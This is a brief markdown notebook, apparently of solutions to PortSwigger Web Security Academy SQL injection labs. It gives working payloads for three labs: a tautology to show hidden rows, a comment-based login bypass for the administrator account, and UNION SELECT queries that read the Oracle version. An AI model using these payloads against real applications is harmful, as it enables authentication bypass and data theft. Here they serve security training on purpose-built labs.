# SQL injection


 * [sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


### Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

>**Q. SELECT * FROM products WHERE category = 'Gifts' AND released = 1 **

```sh
'+OR+1=1--
```

### Lab2: SQL injection vulnerability allowing login bypass
>**Q. To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. **

```sh
administrator'--
```
### Lab3: SQL injection attack, querying the database type and version on Oracle

```sh
'+UNION+SELECT+NULL,NULL--
```

```sh
'+UNION+SELECT+'abc','def'+FROM+dual--
```
```sh
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
